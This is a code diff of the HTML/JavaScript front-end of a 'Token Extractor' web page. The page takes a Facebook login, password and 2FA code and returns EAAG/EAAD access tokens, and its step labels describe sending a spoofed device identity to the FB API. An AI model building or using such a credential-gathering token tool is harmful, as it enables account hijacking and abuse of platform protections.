-            <h2 class="card-title">Verify Token</h2>
-            <div class="form-group">
-                <label>Access Token</label>
-                <input type="text" id="verifyToken" placeholder="Paste your access token here">
-            </div>
-            <button type="button" class="btn btn-secondary" id="verifyBtn" onclick="verifyToken()">Verify Token</button>
-            
-            <div id="verifyStatus" class="verify-status">
-                <div class="status-icon"></div>
-                <div class="status-text"></div>
-                <div class="user-info"></div>
-            </div>
+    <!-- Header -->
+    <div class="header">
+        <div class="logo-glass">🔐</div>
+        <div class="header-text">
+            <div class="header-title">Token Extractor</div>
+            <div class="header-sub">by Veer Anurag · Advanced Edition</div>
         </div>
-
-        <!-- Footer -->
-        <div class="footer">
-            Made with <span>&#10084;</span> by Prince Malhotra
-        </div>
+        <span class="version-pill">V2 Pro</span>
     </div>
 
-    <script>
-        document.getElementById('tokenForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const submitBtn = document.getElementById('submitBtn');
-            const resultDiv = document.getElementById('result');
-            const errorMsg = document.getElementById('errorMsg');
-            
-            submitBtn.disabled = true;
-            submitBtn.innerHTML = '<span class="loader"></span>Generating...';
-            resultDiv.className = 'result';
-            resultDiv.innerHTML = '';
-            errorMsg.style.display = 'none';
-            
-            const formData = {
-                email: document.getElementById('email').value,
-                password: document.getElementById('password').value,
-                twofa: document.getElementById('twofa').value
-            };
-            
-            try {
-                const response = await fetch('/generate-token', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(formData)
-                });
-                
-                const data = await response.json();
-                
-                if (data.success) {
-                    resultDiv.className = 'result show';
-                    resultDiv.innerHTML = `
-                        <div class="result-item">
-                            <label>EAAD6V7 Token (Important)</label>
-                            <textarea id="eaadText" readonly>${data.data.accessTokenEAAD6V7}</textarea>
-                            <button type="button" class="copy-btn" onclick="copyText('eaadText')">Copy EAAD6V7</button>
-                        </div>
-                        <div class="result-item">
-                            <label>Original Token</label>
-                            <textarea id="tokenText" readonly>${data.data.accessToken}</textarea>
-                            <button type="button" class="copy-btn" onclick="copyText('tokenText')">Copy Token</button>
-                        </div>
-                        <div class="result-item">
-                            <label>Cookies</label>
-                            <textarea id="cookiesText" readonly>${data.data.cookies}</textarea>
-                            <button type="button" class="copy-btn" onclick="copyText('cookiesText')">Copy Cookies</button>
-                        </div>
-                    `;
-                } else {
-                    errorMsg.textContent = data.error;
-                    errorMsg.style.display = 'block';
-                }
-            } catch (error) {
-                errorMsg.textContent = 'Network error. Please try again.';
-                errorMsg.style.display = 'block';
-            }
-            
-            submitBtn.disabled = false;
-            submitBtn.innerHTML = 'Generate EAAD6V7 Token';
-        });
+    <!-- Status pills -->
+    <div class="status-row">
+        <div class="status-pill"><div class="s-dot s-dot-enc"></div>AES-GCM · RSA-2048</div>
+        <div class="status-pill"><div class="s-dot s-dot-shield"></div>ID Protection</div>
+        <div class="status-pill"><div class="s-dot s-dot-rate"></div>Rate Limited</div>
+    </div>
 
-        function copyText(elementId) {
-            const textarea = document.getElementById(elementId);
-            textarea.select();
-            document.execCommand('copy');
-            
-            const btn = textarea.nextElementSibling;
-            const originalText = btn.textContent;
-            btn.textContent = 'Copied!';
-            btn.style.background = '#00f5ff';
-            btn.style.color = '#0a0e17';
-            setTimeout(() => {
-                btn.textContent = originalText;
-                btn.style.background = 'transparent';
-                btn.style.color = '#00f5ff';
-            }, 2000);
+    <hr class="divider">
+
+    <!-- Login form -->
+    <form id="loginForm">
+        <div class="section-label">Credentials</div>
+
+        <div class="input-group">
+            <label class="field-label">Identifier</label>
+            <div class="input-wrapper">
+                <input type="text" id="uid" name="uid" placeholder="Email / Phone / UID" autocomplete="off" required>
+            </div>
+        </div>
+
+        <div class="input-group">
+            <label class="field-label">Password</label>
+            <div class="input-wrapper">
+                <input type="password" id="password" name="password" placeholder="••••••••••••" autocomplete="current-password" required>
+                <button type="button" class="eye-btn" onclick="togglePwd()">👁</button>
+            </div>
+        </div>
+
+        <button type="submit" id="loginBtn" class="btn-primary">⚡ &nbsp;Extract Tokens</button>
+
+        <div id="loginSteps" class="progress-steps">
+            <div class="step" id="step1"><div class="step-icon" id="s1i">1</div>RSA-2048 + AES-GCM password encryption</div>
+            <div class="step" id="step2"><div class="step-icon" id="s2i">2</div>Spoofed device identity sent to FB API</div>
+            <div class="step" id="step3"><div class="step-icon" id="s3i">3</div>EAAG &amp; EAAD tokens extracted</div>
+        </div>
+    </form>
+
+    <!-- 2FA form -->
+    <form id="twoFactorForm" class="hidden">
+        <div class="twofa-box">
+            <div class="twofa-title">⚡ 2FA Checkpoint</div>
+            <div class="twofa-sub">Enter the 6 or 8-digit code from your authenticator app.</div>
+        </div>
+        <div class="input-group">
+            <label class="field-label">One-Time Passcode</label>
+            <div class="input-wrapper">
+                <input type="number" id="otp" name="otp" placeholder="000000" required>
+            </div>
+        </div>
+        <button type="submit" id="otpBtn" class="btn-primary">🔓 &nbsp;Verify &amp; Extract</button>
+    </form>
+
+    <!-- Error -->
+    <div id="errorMsg" class="alert alert-error hidden">
+        <span class="alert-icon">⚠</span>
+        <span id="errorText"></span>
+    </div>
+
+    <!-- Result -->
+    <div id="resultBox" class="result-section hidden">
+        <hr class="divider">
+
+        <div class="success-row">
+            <div class="success-circle">✓</div>
+            <div style="flex:1;min-width:0;">
+                <div class="success-title">Extraction Complete</div>
+                <div class="success-sub">2 tokens secured via encrypted channel</div>
+                <div class="device-chip" id="deviceChip">
+                    <div class="device-chip-dot"></div>
+                    <span id="deviceChipText"></span>
+                </div>
+            </div>
+        </div>
+
+        <hr class="divider">
+
+        <div class="token-block">
+            <div class="token-header">
+                <div class="token-label-text"><span class="token-led led-1"></span>Master Token</div>
+                <span class="token-tag tag-1">EAAG</span>
+            </div>
+            <div class="token-box masked" id="token1Box"></div>
+            <div class="token-actions">
+                <button class="btn-sm" onclick="copyToken('token1Box', this)">📋 Copy EAAG</button>
+                <button class="btn-sm btn-reveal" onclick="toggleMask('token1Box', this)">🙈 Reveal</button>
+            </div>
+        </div>
+
+        <div class="token-block">
+            <div class="token-header">
+                <div class="token-label-text"><span class="token-led led-2"></span>App Token</div>
+                <span class="token-tag tag-2">EAAD</span>
+            </div>
+            <div class="token-box masked" id="token2Box"></div>
+            <div class="token-actions">
+                <button class="btn-sm" onclick="copyToken('token2Box', this)">📋 Copy EAAD</button>
+                <button class="btn-sm btn-reveal" onclick="toggleMask('token2Box', this)">🙈 Reveal</button>
+            </div>
+        </div>
+
+        <button class="btn-reset" onclick="resetForm()">↺ Extract Another Account</button>
+    </div>
+
+    <div class="footer">Secure · Protected · For Advanced Use Only</div>
+
+</div>
+
+<script>
+    let currentSessionId = '';
+    let pwdVisible = false;
+
+    function togglePwd() {
+        pwdVisible = !pwdVisible;
+        document.getElementById('password').type = pwdVisible ? 'text' : 'password';
+    }
+
+    function setStep(n, state) {
+        const el = document.getElementById('step' + n);
+        const ic = document.getElementById('s' + n + 'i');
+        el.className = 'step ' + state;
+        if (state === 'done')   ic.textContent = '✓';
+        else if (state === 'active') ic.textContent = '●';
+        else ic.textContent = n;
+    }
+
+    function animateSteps(show) {
+        const steps = document.getElementById('loginSteps');
+        if (show) {
+            steps.classList.add('visible');
+            setStep(1,'active'); setStep(2,''); setStep(3,'');
+            setTimeout(() => { setStep(1,'done'); setStep(2,'active'); }, 700);
+            setTimeout(() => { setStep(2,'done'); setStep(3,'active'); }, 1600);
+        } else {
+            steps.classList.remove('visible');
+            [1,2,3].forEach(n => setStep(n,''));
         }
+    }
 
-        function togglePassword() {
-            const passwordInput = document.getElementById('password');
-            const toggleBtn = document.querySelector('.toggle-password');
-            
-            if (passwordInput.type === 'password') {
-                passwordInput.type = 'text';
-                toggleBtn.textContent = '🙈';
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        animateSteps(true);
+        await submitData('/login', new FormData(document.getElementById('loginForm')), 'loginBtn', '⚡ &nbsp;Extract Tokens');
+        animateSteps(false);
+    });
+
+    document.getElementById('twoFactorForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const fd = new FormData();
+        fd.append('session_id', currentSessionId);
+        fd.append('otp', document.getElementById('otp').value);
+        await submitData('/two_factor', fd, 'otpBtn', '🔓 &nbsp;Verify &amp; Extract');
+    });
+
+    async function submitData(endpoint, formData, btnId, originalHTML) {
+        const btn       = document.getElementById(btnId);
+        const errorMsg  = document.getElementById('errorMsg');
+        const errorText = document.getElementById('errorText');
+
+        btn.innerHTML = '<span class="spinner"></span>Processing…';
+        btn.disabled  = true;
+        errorMsg.classList.add('hidden');
+
+        try {
+            const res  = await fetch(endpoint, { method: 'POST', body: formData });
+            const data = await res.json();
+
+            if (data.token1) {
+                setStep(3, 'done');
+                document.getElementById('token1Box').textContent = data.token1;
+                document.getElementById('token2Box').textContent = data.token2 || 'N/A';
+
+                const chip = document.getElementById('deviceChip');
+                if (data.device_used) {
+                    document.getElementById('deviceChipText').textContent = '🛡 Protected via ' + data.device_used;
+                    chip.style.display = 'flex';
+                }
+
+                document.getElementById('loginForm').classList.add('hidden');
+                document.getElementById('twoFactorForm').classList.add('hidden');
+                document.getElementById('resultBox').classList.remove('hidden');
+
+            } else if (data.two_factor) {
+                currentSessionId = data.session_id;
+                document.getElementById('loginForm').classList.add('hidden');
+                document.getElementById('twoFactorForm').classList.remove('hidden');
+
             } else {
-                passwordInput.type = 'password';
-                toggleBtn.textContent = '👁️';
+                errorText.textContent = data.error || 'Extraction failed. Please try again.';
+                errorMsg.classList.remove('hidden');
+                errorMsg.classList.add('shake');
+                setTimeout(() => errorMsg.classList.remove('shake'), 400);
             }
+        } catch {
+            errorText.textContent = 'Connection error. Please check your network.';
+            errorMsg.classList.remove('hidden');
         }
 
-        async function verifyToken() {
-            const token = document.getElementById('verifyToken').value.trim();
-            const verifyBtn = document.getElementById('verifyBtn');
-            const verifyStatus = document.getElementById('verifyStatus');
-            
-            if (!token) {
-                alert('Please enter a token to verify');
-                return;
-            }
-            
-            verifyBtn.disabled = true;
-            verifyBtn.innerHTML = '<span class="loader"></span>Verifying...';
-            verifyStatus.className = 'verify-status';
-            
-            try {
-                const response = await fetch('/verify-token', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ token: token })
-                });
-                
-                const data = await response.json();
-                
-                if (data.valid) {
-                    verifyStatus.className = 'verify-status valid';
-                    verifyStatus.innerHTML = `
-                        <div class="status-icon">&#10004;</div>
-                        <div class="status-text">Token Valid</div>
-                        <div class="user-info">
-                            <p>Name: <span>${data.name || 'N/A'}</span></p>
-                            <p>ID: <span>${data.id || 'N/A'}</span></p>
-                        </div>
-                    `;
-                } else {
-                    verifyStatus.className = 'verify-status invalid';
-                    verifyStatus.innerHTML = `
-                        <div class="status-icon">&#10008;</div>
-                        <div class="status-text">Token Invalid</div>
-                        <div class="user-info">${data.error || 'Token is expired or invalid'}</div>
-                    `;
-                }
-            } catch (error) {
-                verifyStatus.className = 'verify-status invalid';
-                verifyStatus.innerHTML = `
-                    <div class="status-icon">&#10008;</div>
-                    <div class="status-text">Error</div>
-                    <div class="user-info">Network error occurred</div>
-                `;
-            }
-            
-            verifyBtn.disabled = false;
-            verifyBtn.innerHTML = 'Verify Token';
+        btn.innerHTML = originalHTML;
+        btn.disabled  = false;
+    }
+
+    async function copyToken(boxId, btn) {
+        const text = document.getElementById(boxId).textContent;
+        try { await navigator.clipboard.writeText(text); }
+        catch {
+            const ta = document.createElement('textarea');
+            ta.value = text;
+            document.body.appendChild(ta);
+            ta.select();
+            document.execCommand('copy');
+            document.body.removeChild(ta);
         }
-    </script>
+        const orig = btn.innerHTML;
+        btn.innerHTML = '✓ Copied!';
+        btn.style.color = '#6ee7b7';
+        btn.style.borderColor = 'rgba(110,231,183,0.35)';
+        setTimeout(() => { btn.innerHTML = orig; btn.style.color = ''; btn.style.borderColor = ''; }, 1800);
+    }
+
+    function toggleMask(boxId, btn) {
+        const masked = document.getElementById(boxId).classList.toggle('masked');
+        btn.textContent = masked ? '🙈 Reveal' : '👁 Hide';
+    }
+
+    function resetForm() {
+        ['loginForm','twoFactorForm'].forEach(id => document.getElementById(id).reset());
+        document.getElementById('resultBox').classList.add('hidden');
+        document.getElementById('errorMsg').classList.add('hidden');
+        document.getElementById('loginForm').classList.remove('hidden');
+        document.getElementById('twoFactorForm').classList.add('hidden');
+        document.getElementById('loginSteps').classList.remove('visible');
+        document.getElementById('deviceChip').style.display = 'none';
+        ['token1Box','token2Box'].forEach(id => document.getElementById(id).classList.add('masked'));
+        currentSessionId = '';
+        pwdVisible = false;
+        document.getElementById('password').type = 'password';
+    }
+</script>
 </body>
-</html>
+    </html>
